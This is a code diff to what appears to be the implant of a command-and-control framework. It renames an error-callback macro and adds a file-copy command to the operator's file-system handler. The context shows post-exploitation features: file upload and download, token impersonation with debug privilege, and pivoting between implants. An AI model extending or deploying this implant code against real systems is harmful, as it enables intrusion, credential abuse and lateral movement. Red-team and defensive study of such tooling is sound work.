@@ -763,7 +763,7 @@ VOID CommandFS( PPARSER DataArgs )
             if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
             {
                 PUTS( "CreateFileA: Failed" )
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
                 goto CleanupDownload;
             }
 
@@ -773,7 +773,7 @@ VOID CommandFS( PPARSER DataArgs )
             if ( ! Instance->Win32.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
             {
                 PUTS( "ReadFile: Failed" )
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
                 goto CleanupDownload;
             }
 
@@ -817,14 +817,14 @@ VOID CommandFS( PPARSER DataArgs )
             if ( hFile == INVALID_HANDLE_VALUE )
             {
                 PUTS( "CreateFileA: Failed" )
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
                 goto CleanupUpload;
             }
 
             if ( ! Instance->Win32.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
             {
                 PUTS( "WriteFile: Failed" )
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
                 goto CleanupUpload;
             }
 
@@ -910,6 +910,33 @@ VOID CommandFS( PPARSER DataArgs )
             break;
         }
 
+        case 7: PUTS( "FS::Copy" )
+        {
+            DWORD FromSize = 0;
+            DWORD ToSize   = 0;
+            LPSTR PathFrom = NULL;
+            LPSTR PathTo   = NULL;
+            BOOL  Success  = FALSE;
+
+            PathFrom = ParserGetBytes( DataArgs, &FromSize );
+            PathTo   = ParserGetBytes( DataArgs, &ToSize );
+
+            PathFrom[ FromSize ] = 0;
+            PathTo[ ToSize ]     = 0;
+
+            PRINTF( "Copy file %s to %s\n", PathFrom, PathTo )
+
+            Success = Instance->Win32.CopyFileA( PathFrom, PathTo, FALSE );
+            if ( ! Success )
+                CALLBACK_GETLASTERROR
+
+            PackageAddInt32( Package, Success );
+            PackageAddBytes( Package, PathFrom, FromSize );
+            PackageAddBytes( Package, PathTo, ToSize );
+
+            break;
+        }
+
         case 9:
         {
             PUTS( "FS::GetPwd" )
@@ -946,7 +973,7 @@ VOID CommandFS( PPARSER DataArgs )
             if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
             {
                 PUTS( "CreateFileA: Failed" )
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
                 goto CleanupCat;
             }
 
@@ -956,7 +983,7 @@ VOID CommandFS( PPARSER DataArgs )
             if ( ! Instance->Win32.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
             {
                 PUTS( "ReadFile: Failed" )
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
                 goto CleanupDownload;
             }
 
@@ -1205,7 +1232,7 @@ VOID CommandToken( PPARSER Parser )
             TokenSetPrivilege( SE_DEBUG_NAME, TRUE );
 
             if ( ! Instance->Win32.RevertToSelf() )
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
 
             if ( Instance->Win32.ImpersonateLoggedOnUser( TokenData->Handle ) )
             {
@@ -1223,12 +1250,12 @@ VOID CommandToken( PPARSER Parser )
 
                 PRINTF( "[!] Failed to impersonate token user: %s\n", TokenData->DomainUser );
 
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
 
                 PackageAddInt32( Package, FALSE );
 
                 if ( ! Instance->Win32.RevertToSelf() )
-                    SEND_WIN32_BACK
+                    CALLBACK_GETLASTERROR
             }
 
             PackageAddBytes( Package, TokenData->DomainUser, StringLengthA( TokenData->DomainUser ) );
@@ -1435,7 +1462,7 @@ VOID CommandToken( PPARSER Parser )
             PackageAddInt32( Package, Success );
 
             if ( ! Success )
-                SEND_WIN32_BACK;
+                CALLBACK_GETLASTERROR;
 
             Instance->Tokens.Token       = NULL;
             Instance->Tokens.Impersonate = FALSE;
@@ -2511,7 +2538,7 @@ VOID CommandPivot( PPARSER Parser )
                 if ( ! Instance->Win32.WriteFile( PivotData->Handle, Data, Size, &Size, NULL ) )
                 {
                     PRINTF( "WriteFile: Failed[%d]\n", NtGetLastError() );
-                    SEND_WIN32_BACK
+                    CALLBACK_GETLASTERROR
                 } else PUTS( "Successful wrote demon data" )
             } else PUTS( "Didn't found demon pivot" )
         }
